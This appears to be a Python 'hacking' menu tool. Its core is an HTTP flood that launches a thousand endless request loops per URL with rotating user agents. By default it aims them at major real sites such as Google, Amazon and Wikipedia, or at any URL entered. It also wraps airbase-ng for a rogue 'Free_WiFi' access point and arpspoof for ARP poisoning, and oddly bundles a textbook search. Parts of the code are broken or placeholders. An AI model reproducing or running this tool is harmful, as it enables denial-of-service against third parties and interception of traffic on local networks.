import threading
import time
import aiohttp
import asyncio
import random
import subprocess
from googlesearch import search

# List of high-traffic websites for testing
default_urls = [
    "http://example.com", "http://example.org", "http://example.net",
    "http://google.com", "http://facebook.com", "http://amazon.com",
    "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
    "http://twitter.com", "http://instagram.com", "http://linkedin.com",
    "http://netflix.com", "http://bing.com", "http://reddit.com"
]

# List of user-agents to randomize requests
default_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

async def fetch(session, url, ip=None):
    headers = {'User-Agent': random.choice(default_user_agents)}
    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None  # Bind to the IP if provided
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            try:
                async with session.get(url, headers=headers) as response:
                    await response.text()
            except Exception as e:
                print(f"Error: {e}")
                await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting

async def start_flood(url, ip=None):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url, ip))
            tasks.append(task)
        await asyncio.gather(*tasks)

def network_stress(ip=None, custom_urls=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    urls = custom_urls if custom_urls else default_urls
    for url in urls:
        tasks.append(loop.create_task(start_flood(url, ip)))
    loop.run_until_complete(asyncio.wait(tasks))

def connect_and_stress(target_ip, relay_ip):
    # Example function to connect to a relay IP and then perform stress testing
    print(f"Connecting to {relay_ip} to relay stress test to {target_ip}")
    # Placeholder for connecting logic, e.g., using SSH or a VPN
    # Once connected, initiate network stress
    network_stress(target_ip)

def wifi_spoofing():
    # Example command for WiFi spoofing
    command = ["airbase-ng", "--essid", "Free_WiFi", "wlan0"]
    subprocess.run(command)

def arp_spoofing(target_ip, spoof_ip):
    # Example command for ARP spoofing
    command = ["arpspoof", "-t", target_ip, spoof_ip]
    subprocess.run(command)

def scrape_chinese_textbooks(query):
    results = search(query, num_results=10, lang="zh")
    return results

def display_books(books):
    for book in books:
        print(f"Link: {book}")
        print("-" * 20)

def display_ui():
    while True:
        print("""
         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░██████[...]
         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══██╔[...]
         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░██║[...]
         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░░██║[...]
         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░░░██║[...]
         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░░░░╚═╝[...]

        [1] Ethernet-based Desktop
        [2] IP-based
        [3] Wireless WiFi-based
        [4] WiFi Spoofing
        [5] ARP Spoofing
        [6] Connect and Stress via Relay IP
        [7] Scrape Chinese Textbooks
        [8] Stress Test a Custom URL
        [9] Exit
        """)

        choice = input("Select the method (1-9): ").strip()
        ip_address = None

        if choice == "1":
            print("Selected Ethernet-based Desktop")
            nearby_options = ["Option1", "Option2", "Option3"]
            print("Select a nearby device:")
            for i, option in enumerate(nearby_options, start=1):
                print(f"[{i}] {option}")
            print("[4] Other (Enter MAC address or IP)")
            device_choice = input("Select (1-4): ").strip()
            if device_choice == "4":
                ip_address = input("Enter the MAC address or IP address: ").strip()
            proceed = input("Proceed with Ethernet stress test? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting Ethernet-based stress test...")
                network_stress(ip_address)
            else:
                continue
        elif choice == "2":
            ip_address = input("Enter the IP address to use: ").strip()
        elif choice == "3":
            print("Selected Wireless WiFi-based")
            nearby_options = ["Option1", "Option2", "Option3"]
            print("Select a nearby device:")
            for i, option in enumerate(nearby_options, start=1):
                print(f"[{i}] {option}")
            print("[4] Other (Enter MAC address or IP)")
            device_choice = input("Select (1-4): ").strip()
            if device_choice == "4":
                ip_address = input("Enter the MAC address or IP address: ").strip()
            proceed = input("Proceed with Wireless WiFi-based stress test? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting Wireless WiFi-based stress test...")
                network_stress(ip_address)
            else:
                continue
        elif choice == "4":
            print("Selected WiFi Spoofing")
            wifi_spoofing()
        elif choice == "5":
            target_ip = input("Enter the target IP address: ").strip()
            spoof_ip = input("Enter the spoof IP address: ").strip()
            print("Selected ARP Spoofing")
            arp_spoofing(target_ip, spoof_ip)
        elif choice == "6":
            target_ip = input("Enter the target IP address: ").strip()
            relay_ip = input("Enter the relay IP address: ").strip()
            print("Selected Connect and Stress via Relay IP")
            connect_and_stress(target_ip, relay_ip)
        elif choice == "7":
            query = input("Enter the search query in Chinese: ").strip()
            books = scrape_chinese_textbooks(query)
            display_books(books)
        elif choice == "8":
            custom_url = input("Enter the URL to stress test: ").strip()
            proceed = input("Proceed with stress test on the custom URL? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting stress test on the custom URL...")
                network_stress(custom_urls=[custom_url])
            else:
                continue
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid option selected.")
        
        input("Press Enter to return to the menu...")

if __name__ == "__main__":
    display_ui()
